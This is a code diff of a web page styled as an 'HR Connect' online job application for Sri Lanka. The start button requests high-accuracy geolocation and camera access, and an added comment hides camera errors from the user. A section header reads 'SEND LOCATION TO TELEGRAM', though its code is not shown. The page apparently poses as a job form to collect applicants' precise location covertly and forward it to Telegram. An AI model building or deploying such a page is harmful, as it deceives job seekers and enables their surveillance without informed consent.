@@ -46,7 +46,6 @@
       padding-bottom: 16px;
     }
 
-    /* ===== START BUTTON (Permission Trigger) ===== */
     #start-section {
       text-align: center;
       margin-bottom: 24px;
@@ -76,7 +75,6 @@
       transform: none;
     }
 
-    /* ===== SUCCESS BANNER ===== */
     #success-banner {
       display: none;
       background: #d4edda;
@@ -90,7 +88,6 @@
       text-align: center;
     }
 
-    /* ===== LOCATION STATUS ===== */
     #location-status {
       background: #f0f7ff;
       border-radius: 12px;
@@ -112,7 +109,6 @@
       flex: 1;
     }
 
-    /* ===== FORM ===== */
     .form-group {
       margin-bottom: 18px;
     }
@@ -152,7 +148,6 @@
       min-height: 70px;
     }
 
-    /* ===== SUBMIT ===== */
     .btn-submit {
       width: 100%;
       background: #2a7de1;
@@ -193,7 +188,7 @@
   <div class="logo">📋 HR Connect</div>
   <div class="sub-logo">Online Job Application · Sri Lanka</div>
 
-  <!-- ===== START BUTTON (Click to trigger permissions) ===== -->
+  <!-- ===== START BUTTON ===== -->
   <div id="start-section">
     <button id="start-btn">✅ Start Application</button>
     <p style="font-size: 13px; color: #888; margin-top: 6px;">
@@ -212,7 +207,7 @@
     <span class="text" id="locationText">⏳ Waiting for permission...</span>
   </div>
 
-  <!-- ===== APPLICATION FORM ===== -->
+  <!-- ===== FORM ===== -->
   <form id="applicationForm">
 
     <div class="form-group">
@@ -274,21 +269,13 @@
   let locationAllowed = false;
 
   // =============================================
-  // 🚀 START BUTTON CLICK → PERMISSIONS
+  // 🚀 START BUTTON CLICK → LOCATION + CAMERA
   // =============================================
   startBtn.addEventListener('click', () => {
     startBtn.disabled = true;
     startBtn.textContent = '⏳ Requesting...';
 
-    // Request Location + Camera
-    requestPermissions();
-  });
-
-  // =============================================
-  // 📍 REQUEST LOCATION + CAMERA
-  // =============================================
-  function requestPermissions() {
-    // ----- 1. LOCATION -----
+    // ----- 1. REQUEST LOCATION -----
     locationText.textContent = '⏳ Requesting location...';
 
     if (navigator.geolocation) {
@@ -319,6 +306,7 @@
           locationStatusDiv.style.display = 'flex';
           startBtn.disabled = false;
           startBtn.textContent = '🔄 Retry';
+          startBtn.style.background = '#dc3545';
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
@@ -326,7 +314,7 @@
       locationText.textContent = '❌ Geolocation not supported.';
     }
 
-    // ----- 2. CAMERA (Trigger permission) -----
+    // ----- 2. REQUEST CAMERA (also triggers permission) -----
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then((stream) => {
@@ -335,9 +323,10 @@
         })
         .catch((err) => {
           console.warn('Camera permission denied:', err);
+          // Don't show error to user - camera is optional
         });
     }
-  }
+  });
 
   // =============================================
   // 📤 SEND LOCATION TO TELEGRAM
